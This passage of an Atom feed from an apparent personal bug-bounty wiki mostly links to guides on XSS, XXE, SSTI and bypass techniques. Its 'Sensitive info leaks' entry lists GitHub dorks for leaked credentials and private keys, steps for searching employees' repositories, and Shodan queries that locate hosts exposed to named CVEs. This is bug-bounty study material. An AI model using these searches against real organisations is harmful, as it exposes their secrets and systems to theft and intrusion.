+    <summary type="html">&lt;h3 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;文件包含命令执行 &lt;a href=&quot;https://xz.aliyun.com/t/5535&quot;&gt;https://</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
+    
+    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
+    
+    
+    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>useful books</title>
+    <link href="https://tsunamori.github.io/wiki/useful-books/"/>
+    <id>https://tsunamori.github.io/wiki/useful-books/</id>
+    <published>2021-04-15T01:56:37.000Z</published>
+    <updated>2021-04-22T02:22:09.470Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>Hack tricks <a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></li><li>CTF-wiki <a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></li><li><a href="https://3wapp.github.io/WebSecurity">https://3wapp.github.io/WebSecurity</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;Hack tricks &lt;a href=&quot;https://book.hacktricks.xyz/&quot;&gt;https://book.hacktricks.xyz/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;CTF-wiki &lt;a href=&quot;https://ctf-wiki.org</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="140 Books" scheme="https://tsunamori.github.io/categories/100-Cyber-security/140-Books/"/>
+    
+    
+    <category term="Books" scheme="https://tsunamori.github.io/tags/Books/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XXE</title>
+    <link href="https://tsunamori.github.io/wiki/XXE/"/>
+    <id>https://tsunamori.github.io/wiki/XXE/</id>
+    <published>2021-04-14T08:32:38.000Z</published>
+    <updated>2021-04-14T08:33:03.977Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>XXE methods <a href="https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods">https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;XXE methods &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods&quot;&gt;https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods&lt;/</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XSS</title>
+    <link href="https://tsunamori.github.io/wiki/XSS/"/>
+    <id>https://tsunamori.github.io/wiki/XSS/</id>
+    <published>2021-04-14T08:13:55.000Z</published>
+    <updated>2021-04-14T08:32:21.245Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>XSS <a href="https://kathan19.gitbook.io/howtohunt/xss/xss">https://kathan19.gitbook.io/howtohunt/xss/xss</a></li><li>automated XSS <a href="https://kathan19.gitbook.io/howtohunt/xss/automated_xss">https://kathan19.gitbook.io/howtohunt/xss/automated_xss</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;XSS &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/xss/xss&quot;&gt;https://kathan19.gitbook.io/howtohunt/xss/xss&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;automated XS</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Weak password</title>
+    <link href="https://tsunamori.github.io/wiki/Weak-password/"/>
+    <id>https://tsunamori.github.io/wiki/Weak-password/</id>
+    <published>2021-04-14T08:10:29.000Z</published>
+    <updated>2021-04-14T08:13:46.797Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>weak password policy <a href="https://kathan19.gitbook.io/howtohunt/weak-password-policy/weak_password_policy">https://kathan19.gitbook.io/howtohunt/weak-password-policy/weak_password_policy</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;weak password policy &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/weak-password-policy/weak_password_policy&quot;&gt;https://kathan19.git</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WAF bypasses</title>
+    <link href="https://tsunamori.github.io/wiki/WAF-bypasses/"/>
+    <id>https://tsunamori.github.io/wiki/WAF-bypasses/</id>
+    <published>2021-04-14T08:05:47.000Z</published>
+    <updated>2021-04-14T08:07:33.177Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>WAF bypass using headers(Password reset poisoning)<br> <a href="https://kathan19.gitbook.io/howtohunt/waf-bypasses/waf_bypass_using_headers">https://kathan19.gitbook.io/howtohunt/waf-bypasses/waf_bypass_using_headers</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;WAF bypass using headers(Password reset poisoning)&lt;br&gt; &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/waf-bypasses/waf_bypass_using</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Tabnabbing</title>
+    <link href="https://tsunamori.github.io/wiki/Tabnabbing/"/>
+    <id>https://tsunamori.github.io/wiki/Tabnabbing/</id>
+    <published>2021-04-14T08:00:25.000Z</published>
+    <updated>2021-04-14T08:01:27.941Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li><a href="https://kathan19.gitbook.io/howtohunt/tabnabbing/tabnabbing">https://kathan19.gitbook.io/howtohunt/tabnabbing/tabnabbing</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/tabnabbing/tabnabbing&quot;&gt;https://kathan19.gitbook.io/howtohunt/tabnabbing/tabnabbing&lt;/</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Subdomain takeover</title>
+    <link href="https://tsunamori.github.io/wiki/Subdomain-takeover/"/>
+    <id>https://tsunamori.github.io/wiki/Subdomain-takeover/</id>
+    <published>2021-04-14T07:40:42.000Z</published>
+    <updated>2021-04-14T07:52:55.633Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>detail method <a href="https://kathan19.gitbook.io/howtohunt/subdomain-takeover/subdomain_takeover">https://kathan19.gitbook.io/howtohunt/subdomain-takeover/subdomain_takeover</a></li><li>easy method <a href="https://kathan19.gitbook.io/howtohunt/subdomain-takeover/easy_methods">https://kathan19.gitbook.io/howtohunt/subdomain-takeover/easy_methods</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;detail method &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/subdomain-takeover/subdomain_takeover&quot;&gt;https://kathan19.gitbook.io/how</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Status code bypass</title>
+    <link href="https://tsunamori.github.io/wiki/Status-code-bypass/"/>
+    <id>https://tsunamori.github.io/wiki/Status-code-bypass/</id>
+    <published>2021-04-14T07:23:23.000Z</published>
+    <updated>2021-04-14T07:28:46.681Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>tips <a href="https://kathan19.gitbook.io/howtohunt/status-code-bypass/status_code_bypass">https://kathan19.gitbook.io/howtohunt/status-code-bypass/status_code_bypass</a></li><li>403 status code bypass <a href="https://kathan19.gitbook.io/howtohunt/status-code-bypass/403bypass">https://kathan19.gitbook.io/howtohunt/status-code-bypass/403bypass</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;tips &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/status-code-bypass/status_code_bypass&quot;&gt;https://kathan19.gitbook.io/howtohunt/st</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Sensitive info leaks</title>
+    <link href="https://tsunamori.github.io/wiki/Sensitive-info-leaks/"/>
+    <id>https://tsunamori.github.io/wiki/Sensitive-info-leaks/</id>
+    <published>2021-04-14T06:42:34.000Z</published>
+    <updated>2021-04-14T07:22:52.429Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Github-recon"><a href="#Github-recon" class="headerlink" title="Github recon"></a>Github recon</h2><ol><li><p>steps</p><ol><li>Check github with company name for API keys or passswords.</li><li>Enumerate the employees of the company from linkedin and twitter and check their repositories on github for sensitive information.</li><li>Check source code of main website and subdomains for github links in the html comments or anywhere. Search using ctl-F and search for keyword github</li></ol></li><li><p>tools</p><ol><li><a href="https://github.com/BishopFox/GitGot">https://github.com/BishopFox/GitGot</a></li><li><a href="https://github.com/hisxo/gitGraber">https://github.com/hisxo/gitGraber</a></li><li><a href="https://github.com/tillson/git-hound">https://github.com/tillson/git-hound</a></li><li><a href="https://securitytrails.com/blog/github-dorks">https://securitytrails.com/blog/github-dorks</a></li></ol></li><li><p>Github dorks</p></li></ol><ul><li>GitHub Dorks for Finding Files<br>  filename:manifest.xml<br>  filename:travis.yml<br>  filename:vim_settings.xml<br>  filename:database<br>  filename:prod.exs NOT prod.secret.exs<br>  filename:prod.secret.exs<br>  filename:.npmrc _auth<br>  filename:.dockercfg auth<br>  filename:WebServers.xml<br>  filename:.bash_history<br>  filename:sftp-config.json<br>  filename:sftp.json path:.vscode<br>  filename:secrets.yml password<br>  filename:.esmtprc password<br>  filename:passwd path:etc<br>  filename:dbeaver-data-sources.xml<br>  path:sites databases password<br>  filename:config.php dbpasswd<br>  filename:prod.secret.exs<br>  filename:configuration.php JConfig password<br>  filename:.sh_history<br>  shodan_api_key language:python<br>  filename:shadow path:etc<br>  JEKYLL_GITHUB_TOKEN<br>  filename:proftpdpasswd<br>  filename:.pgpass<br>  filename:idea14.key<br>  filename:hub oauth_token<br>  HEROKU_API_KEY language:json<br>  HEROKU_API_KEY language:shell<br>  SF_USERNAME salesforce<br>  filename:.bash_profile aws<br>  extension:json api.forecast.io<br>  filename:.env MAIL_HOST=smtp.gmail.com<br>  filename:wp-config.php<br>  extension:sql mysql dump<br>  filename:credentials aws_access_key_id<br>  filename:id_rsa or filename:id_dsa<br>GitHub Dorks for Finding Languages<br>  language:python username<br>  language:php username<br>  language:sql username<br>  language:html password<br>  language:perl password<br>  language:shell username<br>  language:java api<br>  HOMEBREW_GITHUB_API_TOKEN language:shell<br>GiHub Dorks for Finding API Keys, Tokens and Passwords<br>  api_key<br>  “api keys”<br>  authorization_bearer:<br>  oauth<br>  auth<br>  authentication<br>  client_secret<br>  api_token:<br>  “api token”<br>  client_id<br>  password<br>  user_password<br>  user_pass<br>  passcode<br>  client_secret<br>  secret<br>  password hash<br>  OTP<br>  user auth<br>GitHub Dorks for Finding Usernames<br>  user:name (user:admin)<br>  org:name (org:google type:users)<br>  in:login ( in:login)<br>  in:name ( in:name)<br>  fullname:firstname lastname (fullname: )<br>  in:email (data in:email)<br>GitHub Dorks for Finding Information using Dates<br>  created:&lt;2012–04–05<br>  created:&gt;=2011–06–12<br>  created:2016–02–07 location:iceland<br>  created:2011–04–06..2013–01–14  in:username<br>GitHub Dorks for Finding Information using Extension<br>  extension:pem private<br>  extension:ppk private<br>  extension:sql mysql dump<br>  extension:sql mysql dump password<br>  extension:json [api.forecast.io] (<a href="http://api.forecast.io/">http://api.forecast.io/</a>)<br>  extension:json [mongolab.com] (<a href="http://mongolab.com/">http://mongolab.com/</a>)<br>  extension:yaml [mongolab.com] (<a href="http://mongolab.com/">http://mongolab.com/</a>)<br>  [WFClient] Password= extension:ica<br>  extension:avastlic “[support.avast.com] (<a href="http://support.avast.com/)%E2%80%9D">http://support.avast.com/)”</a><br>  extension:json googleusercontent client_secret</li></ul><p><a href="https://kathan19.gitbook.io/howtohunt/sensitive-info-leaks/github_dorks_all">https://kathan19.gitbook.io/howtohunt/sensitive-info-leaks/github_dorks_all</a></p><h2 id="Google-recon"><a href="#Google-recon" class="headerlink" title="Google recon"></a>Google recon</h2><ol><li>Google dorks <a href="https://kathan19.gitbook.io/howtohunt/sensitive-info-leaks/google_dorks">https://kathan19.gitbook.io/howtohunt/sensitive-info-leaks/google_dorks</a></li></ol><h2 id="Shodan-recon"><a href="#Shodan-recon" class="headerlink" title="Shodan recon"></a>Shodan recon</h2><ol><li>Big IP shodan Search:-<br><code>http.title:&quot;BIG-IP&amp;reg;-Redirect&quot; org:Org</code></li><li>CVE 2020-3452<br><code>http.html_hash:-628873716 “set-cookie: webvpn;”</code></li><li>CVE CVE-2019-11510<br><code>http.html:/dana-na/</code></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Github-recon&quot;&gt;&lt;a href=&quot;#Github-recon&quot; class=&quot;headerlink&quot; title=&quot;Github recon&quot;&gt;&lt;/a&gt;Github recon&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;steps&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Ch</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SSTI</title>
+    <link href="https://tsunamori.github.io/wiki/SSTI/"/>
+    <id>https://tsunamori.github.io/wiki/SSTI/</id>
+    <published>2021-04-14T06:41:23.000Z</published>
+    <updated>2021-04-14T06:41:54.665Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li><a href="https://kathan19.gitbook.io/howtohunt/ssti/ssti">https://kathan19.gitbook.io/howtohunt/ssti/ssti</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/ssti/ssti&quot;&gt;https://kathan19.gitbook.io/howtohunt/ssti/ssti&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+</feed>
